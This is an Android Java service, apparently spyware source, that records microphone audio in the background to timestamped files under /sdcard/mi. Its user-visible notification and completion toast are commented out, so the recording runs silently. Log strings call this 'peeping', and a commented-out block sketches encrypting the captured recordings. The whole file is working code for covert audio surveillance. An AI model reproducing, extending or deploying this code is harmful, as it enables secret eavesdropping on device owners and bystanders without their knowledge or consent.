package com.cal;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;
//import java.security.KeyPairGenerator;
//import java.security.KeyPair;
//import java.security.Key;

public class MyInfoService extends Service implements
		MediaRecorder.OnInfoListener, MediaRecorder.OnErrorListener {
	private static final String TAG = "KAL";

	public static final String DEFAULT_STORAGE_LOCATION = "/sdcard/mi";
	private static final int RECORDING_NOTIFICATION_ID = 1;

	private MediaRecorder recorder = null;
	private boolean isRecording = false;
	private File recFile = null;;

	/*
	 * private static void test() throws java.security.NoSuchAlgorithmException
	 * { KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
	 * kpg.initialize(2048); KeyPair kp = kpg.genKeyPair(); Key publicKey =
	 * kp.getPublic(); Key privateKey = kp.getPrivate(); }
	 */

	// private File makeOutputFile (SharedPreferences prefs)
	private File makeOutputFile() {
		File dir = new File(DEFAULT_STORAGE_LOCATION);

		// test dir for existence and writeability
		if (!dir.exists()) {
			try {
				dir.mkdirs();
			} catch (Exception e) {
				Log.e("MyInfoService",
						"MyInfoService::makeOutputFile unable to create directory "
								+ dir + ": " + e);
				Toast t = Toast.makeText(getApplicationContext(),
						"MyInfoService was unable to create the directory "
								+ dir + " to store recordings: " + e,
						Toast.LENGTH_LONG);
				t.show();
				return null;
			}
		} else {
			if (!dir.canWrite()) {
				Log.e(TAG,
						"MyInfoService::makeOutputFile does not have write permission for directory: "
								+ dir);
				Toast t = Toast.makeText(getApplicationContext(),
						"MyInfoService does not have write permission for the directory directory "
								+ dir + " to store recordings",
						Toast.LENGTH_LONG);
				t.show();
				return null;
			}
		}

		// test size

		// create filename based on call data
		//SimpleDateFormat sdf = new SimpleDateFormat("yyyy-mm-dd_HH_MM_SS");
		String prefix = "file_"+new Date().getTime();
		
		// prefix = sdf.format(new Date()) + "-callrecording";
		// add info to file name about what audio channel we were recFile
		// int audiosource =
		// Integer.parseInt(prefs.getString("PREF_AUDIO_SOURCE", "1"));
		//prefix += "-channel" + "PREF_AUDIO_SOURCE" + "-";

		// create suffix based on format
		String suffix = "";
		int audioformat = 3; // Integer.parseInt(prefs.getString(Preferences.PREF_AUDIO_FORMAT,
								// "1"));
		switch (audioformat) {
		case MediaRecorder.OutputFormat.THREE_GPP:
			suffix = ".3gpp";
			break;
		case MediaRecorder.OutputFormat.MPEG_4:
			suffix = ".mpg";
			break;
		case MediaRecorder.OutputFormat.RAW_AMR:
			//suffix = ".amr";
			suffix = ".txt";
			break;
		}

		try {
			return File.createTempFile(prefix, suffix, dir);
		} catch (IOException e) {
			Log.e("MyInfoService",
					"MyInfoService::makeOutputFile unable to create temp file in "
							+ dir + ": " + e);
			Toast t = Toast.makeText(getApplicationContext(),
					"MyInfoService was unable to create temp file in " + dir
							+ ": " + e, Toast.LENGTH_LONG);
			t.show();
			return null;
		}
	}

	public void onCreate() {
		super.onCreate();
		recorder = new MediaRecorder();
		Log.i("MyInfoService", "onCreate created MediaRecorder object");
	}

	public void onStart(Intent intent, int startId) {
		// Log.i("MyInfoService",
		// "MyInfoService::onStart calling through to onStartCommand");
		// onStartCommand(intent, 0, startId);
		// }

		// public int onStartCommand(Intent intent, int flags, int startId)
		// {
		Log.i("MyInfoService",
				"MyInfoService::onStartCommand called while isRecording:"
						+ isRecording);

		if (isRecording)
			return;

		Context c = getApplicationContext();
		// SharedPreferences prefs =
		// PreferenceManager.getDefaultSharedPreferences(c);

		Boolean shouldRecord = true;// prefs.getBoolean(Preferences.PREF_RECORD_CALLS,
									// false);
		if (!shouldRecord) {
			Log.i("CallRecord",
					"MyInfoService::onStartCommand with PREF_RECORD_CALLS false, not recFile");
			// return START_STICKY;
			return;
		}

		// int audiosource =
		// Integer.parseInt(prefs.getString(Preferences.PREF_AUDIO_SOURCE,
		// "1"));
		// int audioformat =
		// Integer.parseInt(prefs.getString(Preferences.PREF_AUDIO_FORMAT,
		// "1"));

		recFile = makeOutputFile();
		if (recFile == null) {
			recorder = null;
			return; // return 0;
		}

		Log.i("MyInfoService",
				"MyInfoService will config MediaRecorder with audiosource: "
						+ "MediaRecorder.AudioSource.MIC" + " audioformat: " + "MediaRecorder.OutputFormat.AMR_NB");
		try {
			// These calls will throw exceptions unless you set the
			// android.permission.RECORD_AUDIO permission for your app
			recorder.reset();
			recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
			Log.d("MyInfoService", "set audiosource "
					+ MediaRecorder.AudioSource.MIC);
			recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
			Log.d("MyInfoService", "set output "
					+ MediaRecorder.OutputFormat.AMR_NB);
			recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
			Log.d("MyInfoService", "set encoder default");
			recorder.setOutputFile(recFile.getAbsolutePath());
			Log.d("MyInfoService", "set file: " + recFile);
			// recorder.setMaxDuration(msDuration); //1000); // 1 seconds
			// recorder.setMaxFileSize(bytesMax); //1024*1024); // 1KB

			recorder.setOnInfoListener(this);
			recorder.setOnErrorListener(this);

			try {
				recorder.prepare();
			} catch (java.io.IOException e) {
				Log.e("MyInfoService",
						"MyInfoService::onStart() IOException attempting recorder.prepare()\n");
				Toast t = Toast.makeText(getApplicationContext(),
						"MyInfoService was unable to start recFile: " + e,
						Toast.LENGTH_LONG);
				t.show();
				recorder = null;
				return; // return 0; //START_STICKY;
			}
			Log.d("MyInfoService", "recorder.prepare() returned");

			recorder.start();
			isRecording = true;
			Log.i("MyInfoService", "recorder.start() returned");
			updateNotification(true);
		} catch (java.lang.Exception e) {
			Toast t = Toast.makeText(getApplicationContext(),
					"MyInfoService was unable to start recFile: " + e,
					Toast.LENGTH_LONG);
			t.show();

			Log.e("MyInfoService",
					"MyInfoService::onStart caught unexpected exception", e);
			recorder = null;
		}

		return; // return 0; //return START_STICKY;
	}

	public void onDestroy() {
		super.onDestroy();

		if (null != recorder) {
			Log.i("MyInfoService",
					"MyInfoService::onDestroy calling recorder.release()");
			isRecording = false;
			recorder.release();
			Toast t = Toast.makeText(getApplicationContext(),
					"MyInfoService finished peeping to " + recFile,
					Toast.LENGTH_LONG);
			//t.show();

			/*
			 * // encrypt the recFile String keyfile = "/sdcard/keyring"; try
			 * { //PGPPublicKey k = readPublicKey(new FileInputStream(keyfile));
			 * test(); } catch (java.security.NoSuchAlgorithmException e) {
			 * Log.e("MyInfoService",
			 * "MyInfoService::onDestroy crypto test failed: ", e); }
			 * //encrypt(recFile);
			 */
		}

		updateNotification(false);
	}

	// methods to handle binding the service

	public IBinder onBind(Intent intent) {
		return null;
	}

	public boolean onUnbind(Intent intent) {
		return false;
	}

	public void onRebind(Intent intent) {
	}

	private void updateNotification(Boolean status) {
		Context c = getApplicationContext();
		//SharedPreferences prefs = PreferenceManager
			//	.getDefaultSharedPreferences(c);

		String ns = Context.NOTIFICATION_SERVICE;
		NotificationManager mNotificationManager = (NotificationManager) getSystemService(ns);

		if (status) {
			int icon = R.drawable.ic_launcher;
			CharSequence tickerText = "Peeping MIC";
					//+ prefs.getString(.PREF_AUDIO_SOURCE, "1");
			long when = System.currentTimeMillis();

			Notification notification = new Notification(icon, tickerText, when);

			Context context = getApplicationContext();
			CharSequence contentTitle = "MyInfoService Status";
			CharSequence contentText = "Peeping MIC...";
			Intent notificationIntent = new Intent(this, MyInfoService.class);
			PendingIntent contentIntent = PendingIntent.getActivity(this, 0,
					notificationIntent, 0);

			notification.setLatestEventInfo(context, contentTitle, contentText,
					contentIntent);
			//mNotificationManager
				//	.notify(RECORDING_NOTIFICATION_ID, notification);
		} else {
			mNotificationManager.cancel(RECORDING_NOTIFICATION_ID);
		}
	}

	// MediaRecorder.OnInfoListener
	public void onInfo(MediaRecorder mr, int what, int extra) {
		Log.i("MyInfoService",
				"MyInfoService got MediaRecorder onInfo callback with what: "
						+ what + " extra: " + extra);
		isRecording = false;
	}

	// MediaRecorder.OnErrorListener
	public void onError(MediaRecorder mr, int what, int extra) {
		Log.e("MyInfoService",
				"MyInfoService got MediaRecorder onError callback with what: "
						+ what + " extra: " + extra);
		isRecording = false;
		mr.release();
	}
}
